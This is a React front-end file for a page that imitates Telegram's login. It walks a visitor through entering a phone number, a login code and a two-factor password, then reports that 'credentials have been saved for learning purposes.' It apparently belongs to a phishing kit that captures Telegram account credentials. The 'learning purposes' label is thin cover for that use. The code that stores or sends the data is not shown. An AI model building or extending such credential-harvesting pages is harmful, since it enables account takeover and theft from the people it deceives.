import React, { useState } from 'react';
import PhoneInput from './components/PhoneInput';
import CodeInput from './components/CodeInput';
import TwoFactorInput from './components/TwoFactorInput';
import './styles.css';

function App() {
  const [step, setStep] = useState(1);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [requiresTwoFactor, setRequiresTwoFactor] = useState(false);

  const handlePhoneSubmit = (phone) => {
    setPhoneNumber(phone);
    setStep(2);
  };

  const handleCodeVerified = (requires2FA) => {
    if (requires2FA) {
      setRequiresTwoFactor(true);
      setStep(3);
    } else {
      setStep(4); // Success
    }
  };

  const handleTwoFactorSubmit = () => {
    setStep(4); // Success
  };

  return (
    <div className="app">
      <div className="telegram-login">
        <div className="header">
         
        </div>
        
        {step === 1 && <PhoneInput onSubmit={handlePhoneSubmit} />}
        {step === 2 && (
          <CodeInput 
            phoneNumber={phoneNumber} 
            onVerified={handleCodeVerified}
          />
        )}
        {step === 3 && (
          <TwoFactorInput 
            phoneNumber={phoneNumber} 
            onSubmit={handleTwoFactorSubmit}
          />
        )}
        {step === 4 && (
          <div className="success-message">
            <h2>✓ Login Successful</h2>
            <p>Credentials have been saved for learning purposes.</p>
            <button onClick={() => setStep(1)}>Login Again</button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;